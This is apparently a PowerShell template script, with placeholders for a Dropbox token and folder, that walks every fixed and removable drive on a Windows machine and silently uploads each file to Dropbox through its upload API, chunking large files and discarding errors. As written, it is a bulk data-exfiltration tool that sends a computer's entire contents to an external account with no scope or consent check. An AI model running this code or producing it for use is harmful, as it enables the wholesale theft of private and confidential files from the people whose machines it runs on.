$ACCESS_TOKEN = "{{ACCESS_TOKEN}}"
$DROPBOX_FOLDER = "{{FOLDER}}"
$CHUNK_SIZE = 8388608
$global:totalFiles = 0
$global:uploadedFiles = 0
$global:failedFiles = 0

function Upload-File($localFile, $rootPath) {
    try {
        $fileSize = (Get-Item $localFile).Length
        $relativePath = $localFile.Substring($rootPath.Length).Replace("\\", "/")
        if (-not $relativePath.StartsWith("/")) {
            $relativePath = "/" + $relativePath
        }
        $dropboxPath = $DROPBOX_FOLDER + $relativePath
        $folderPath = Split-Path -Parent $dropboxPath
        if ($folderPath -ne $DROPBOX_FOLDER) {
            Create-Folder $folderPath
        }
        if ($fileSize -gt 150MB) {
            Upload-LargeFile $localFile $dropboxPath
        } else {
            Upload-SmallFile $localFile $dropboxPath
        }
    }
    catch {
        $global:failedFiles++
        $fileName = Split-Path $localFile -Leaf
        Write-Host "Uploaded: $fileName - Failed"
    }
}

function Upload-SmallFile($localFile, $dropboxPath) {
    try {
        $fileName = Split-Path $localFile -Leaf
        $fileBytes = [System.IO.File]::ReadAllBytes($localFile)
        $arg = @{path=$dropboxPath; mode="overwrite"; autorename=$false; mute=$false} | ConvertTo-Json -Compress
        $headers = @{
            "Authorization" = "Bearer $ACCESS_TOKEN"
            "Content-Type"  = "application/octet-stream"
            "Dropbox-API-Arg" = $arg
        }
        Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $headers -Body $fileBytes | Out-Null
        $global:uploadedFiles++
        Write-Host "Uploaded: $fileName - Success"
    }
    catch {
        $global:failedFiles++
        $fileName = Split-Path $localFile -Leaf
        Write-Host "Uploaded: $fileName - Failed"
    }
}

function Upload-LargeFile($localFile, $dropboxPath) {
    try {
        $fileName = Split-Path $localFile -Leaf
        $fileSize = (Get-Item $localFile).Length
        $sessionId = $null
        $offset = 0
        $stream = [System.IO.File]::OpenRead($localFile)
        $buffer = New-Object byte[] $CHUNK_SIZE
        while ($true) {
            $bytesRead = $stream.Read($buffer, 0, $CHUNK_SIZE)
            if ($bytesRead -eq 0) { break }
            $chunk = $buffer[0..($bytesRead-1)]
            $isLastChunk = ($offset + $bytesRead) -ge $fileSize
            if ($sessionId -eq $null) {
                $headers = @{
                    "Authorization" = "Bearer $ACCESS_TOKEN"
                    "Content-Type"  = "application/octet-stream"
                    "Dropbox-API-Arg" = '{"close": false}'
                }
                $response = Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload_session/start" -Method Post -Headers $headers -Body $chunk
                $sessionId = $response.session_id
            } elseif (-not $isLastChunk) {
                $cursor = '{"session_id": "' + $sessionId + '", "offset": ' + $offset + '}'
                $headers = @{
                    "Authorization" = "Bearer $ACCESS_TOKEN"
                    "Content-Type"  = "application/octet-stream"
                    "Dropbox-API-Arg" = '{"cursor": ' + $cursor + ', "close": false}'
                }
                Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload_session/append_v2" -Method Post -Headers $headers -Body $chunk | Out-Null
            } else {
                $cursor = '{"session_id": "' + $sessionId + '", "offset": ' + $offset + '}'
                $commit = '{"path": "' + $dropboxPath + '", "mode": "overwrite", "autorename": false, "mute": false}'
                $headers = @{
                    "Authorization" = "Bearer $ACCESS_TOKEN"
                    "Content-Type"  = "application/octet-stream"
                    "Dropbox-API-Arg" = '{"cursor": ' + $cursor + ', "commit": ' + $commit + '}'
                }
                Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload_session/finish" -Method Post -Headers $headers -Body $chunk | Out-Null
            }
            $offset += $bytesRead
        }
        $stream.Close()
        $global:uploadedFiles++
        Write-Host "Uploaded: $fileName - Success"
    }
    catch {
        $global:failedFiles++
        $fileName = Split-Path $localFile -Leaf
        Write-Host "Uploaded: $fileName - Failed"
    }
}

function Create-Folder($folderPath) {
    try {
        $headers = @{
            "Authorization" = "Bearer $ACCESS_TOKEN"
            "Content-Type"  = "application/json"
        }
        $body = @{path=$folderPath; autorename=$false} | ConvertTo-Json
        Invoke-RestMethod -Uri "https://api.dropboxapi.com/2/files/create_folder_v2" -Method Post -Headers $headers -Body $body | Out-Null
    }
    catch {
    }
}

function Scan-And-Upload($currentPath) {
    try {
        $items = Get-ChildItem -Path $currentPath -ErrorAction SilentlyContinue
        foreach ($item in $items) {
            if ($item.PSIsContainer) {
                Scan-And-Upload $item.FullName
            } else {
                $global:totalFiles++
                Upload-File $item.FullName $currentPath
            }
        }
    }
    catch {
    }
}

$logicalDisks = Get-WmiObject Win32_LogicalDisk | Where-Object { $_.DriveType -eq 3 -or $_.DriveType -eq 2 }
foreach ($disk in $logicalDisks) {
    $driveRoot = $disk.DeviceID + "\\"
    if (Test-Path $driveRoot) {
        Scan-And-Upload $driveRoot
    }
}
Write-Host "`nTotal files found: $($global:totalFiles)"
Write-Host "Successfully uploaded: $($global:uploadedFiles)"
Write-Host "Failed: $($global:failedFiles)"
